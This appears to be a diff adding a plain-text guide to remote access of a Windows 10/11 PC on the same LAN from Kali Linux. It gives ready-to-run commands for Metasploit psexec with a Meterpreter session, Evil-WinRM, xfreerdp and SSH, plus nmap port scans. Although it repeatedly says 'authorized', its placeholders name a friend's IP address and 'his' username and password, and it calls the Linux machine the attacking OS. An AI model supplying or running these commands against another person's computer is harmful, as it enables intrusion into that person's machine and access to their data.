@@ -1,0 +1,301 @@
+============================================================
+       WINDOWS REMOTE ACCESS - LAN SECURITY ASSESSMENT
+              4 REMOTE ACCESS METHODS
+============================================================
+
+SCENARIO
+------------------------------------------------------------
+
+Target PC: Windows 10/11
+Attacking OS: Linux / Kali Linux
+Network: Same Local Area Network (LAN)
+Target State: Unlocked / Active User Session
+
+Possible assessment areas:
+1. SMB Remote Administration (PsExec)
+2. WinRM Remote Management (Evil-WinRM)
+3. RDP (Remote Desktop Protocol)
+4. SSH (OpenSSH Server)
+
+
+============================================================
+METHOD 1: SMB PSEXEC (METASPLOIT)
+============================================================
+
+BEST FOR:
+Authorized administrative access and remote command execution.
+
+REQUIREMENT:
+- TCP Port 445 (SMB) must be open.
+- Authorized Windows administrator credentials.
+- Remote administrative access must be permitted.
+
+OVERVIEW:
+
+PsExec uses Windows administrative shares such as:
+- C$
+- ADMIN$
+
+It can facilitate remote service execution.
+
+STEPS IN LINUX TERMINAL:
+
+1. Start Metasploit:
+
+msfconsole
+
+2. Load the module:
+
+use exploit/windows/smb/psexec
+
+3. Set target IP:
+
+set RHOSTS <FRIENDS_IP>
+
+4. Set authorized credentials:
+
+set SMBUser <HIS_USERNAME>
+set SMBPass <HIS_PASSWORD>
+
+5. Optional: Configure the domain:
+
+set SMBDomain WORKGROUP
+
+6. Review configuration:
+
+show options
+
+NOTE:
+
+Remote execution requires appropriate administrative
+permissions. Use a controlled lab target for exploitation
+testing.
+
+EXPECTED RESULT:
+
+An authorized test may establish a Meterpreter session.
+The shell command can be used to access a command shell
+within that session.
+
+
+============================================================
+METHOD 2: WINRM - EVIL-WINRM
+============================================================
+
+BEST FOR:
+Remote PowerShell administration on modern Windows systems.
+
+REQUIREMENT:
+- TCP Port 5985 (WinRM HTTP)
+- OR TCP Port 5986 (WinRM HTTPS)
+- Authorized credentials.
+- WinRM service enabled and properly configured.
+
+OVERVIEW:
+
+Windows Remote Management (WinRM) provides remote
+PowerShell administration.
+
+STEPS IN LINUX TERMINAL:
+
+1. Install Evil-WinRM:
+
+sudo gem install evil-winrm
+
+2. Check whether the target WinRM port is reachable:
+
+nmap -p 5985,5986 <FRIENDS_IP>
+
+3. Connect using authorized credentials:
+
+evil-winrm -i <FRIENDS_IP> -u <HIS_USERNAME> -p <HIS_PASSWORD>
+
+EXPECTED RESULT:
+
+An interactive PowerShell remote administration session.
+
+NOTE:
+
+WinRM does not inherently guarantee a fileless or
+undetectable connection. Authentication and access
+permissions must be configured appropriately.
+
+
+============================================================
+METHOD 3: RDP (REMOTE DESKTOP PROTOCOL)
+============================================================
+
+BEST FOR:
+Visual remote desktop access.
+
+REQUIREMENT:
+- TCP Port 3389 (RDP) must be open.
+- Authorized Windows credentials.
+- Remote Desktop enabled.
+- Account permitted to connect through RDP.
+
+OVERVIEW:
+
+RDP allows remote graphical access to a Windows desktop.
+
+STEPS IN LINUX TERMINAL:
+
+1. Install FreeRDP:
+
+sudo apt install freerdp2-x11
+
+2. Connect to the Windows PC:
+
+xfreerdp /v:<FRIENDS_IP> /u:<HIS_USERNAME> /p:<HIS_PASSWORD> /size:100%x95% /dynamic-resolution
+
+EXPECTED RESULT:
+
+A graphical Windows desktop window opens on Linux.
+
+IMPORTANT:
+
+RDP session behavior depends on Windows edition,
+configuration, and session policies.
+
+An existing interactive session may be disconnected
+or affected by another remote login.
+
+
+============================================================
+METHOD 4: SSH (OPENSSH SERVER)
+============================================================
+
+BEST FOR:
+Command-line administration and developer environments.
+
+REQUIREMENT:
+- TCP Port 22 (SSH) must be open.
+- OpenSSH Server installed and running.
+- Authorized Windows credentials or SSH key.
+
+OVERVIEW:
+
+Windows 10/11 supports OpenSSH Server as an optional
+Windows feature.
+
+STEPS IN LINUX TERMINAL:
+
+1. Check SSH port:
+
+nmap -p 22 <FRIENDS_IP>
+
+2. Connect:
+
+ssh <HIS_USERNAME>@<FRIENDS_IP>
+
+3. Enter the authorized password when prompted.
+
+EXPECTED RESULT:
+
+A remote command-line session.
+
+Depending on Windows SSH configuration, the shell
+may be CMD or PowerShell.
+
+
+============================================================
+DECISION MATRIX: WHICH METHOD TO USE?
+============================================================
+
++----------+-------------+------------------------------+
+| METHOD   | PORT        | BEST USE                     |
++----------+-------------+------------------------------+
+| PsExec   | 445         | SMB administration           |
+| WinRM    | 5985/5986   | Remote PowerShell            |
+| RDP      | 3389        | Graphical desktop access     |
+| SSH      | 22          | Remote command-line access   |
++----------+-------------+------------------------------+
+
+METHOD REQUIREMENTS:
+
+PsExec:
+- Administrative credentials
+- SMB access
+- Remote administrative permissions
+
+WinRM:
+- WinRM service enabled
+- Authorized credentials
+- Appropriate remote permissions
+
+RDP:
+- Remote Desktop enabled
+- Authorized credentials
+- RDP access permissions
+
+SSH:
+- OpenSSH Server enabled
+- Authorized credentials or SSH key
+
+
+============================================================
+PRO TIP: CHECK ALL REQUIRED PORTS
+============================================================
+
+Run this command in your Linux terminal:
+
+nmap -p 445,3389,5985,5986,22 <FRIENDS_IP>
+
+PORT REFERENCE:
+
+445       = SMB
+3389      = RDP
+5985      = WinRM HTTP
+5986      = WinRM HTTPS
+22        = SSH
+
+INTERPRETATION:
+
+- Port 445 open:
+  SMB is reachable.
+
+- Port 5985 open:
+  WinRM HTTP is reachable.
+
+- Port 5986 open:
+  WinRM HTTPS is reachable.
+
+- Port 3389 open:
+  RDP is reachable.
+
+- Port 22 open:
+  SSH is reachable.
+
+IMPORTANT:
+An open port alone does not guarantee successful
+authentication or remote administration.
+
+
+============================================================
+FINAL NOTES
+============================================================
+
+1. Port availability does not guarantee access.
+
+2. Valid credentials do not automatically provide
+   administrator privileges.
+
+3. PsExec requires appropriate administrative access.
+
+4. WinRM requires proper service and permission settings.
+
+5. RDP provides graphical access, not automatic
+   control of another user's active session.
+
+6. SSH requires an operational OpenSSH Server.
+
+7. Remote access can generate Windows security logs
+   and network monitoring alerts.
+
+8. Perform all testing only on systems you own or
+   have explicit authorization to assess.
+
+
+============================================================
+                    END OF NOTES
+============================================================
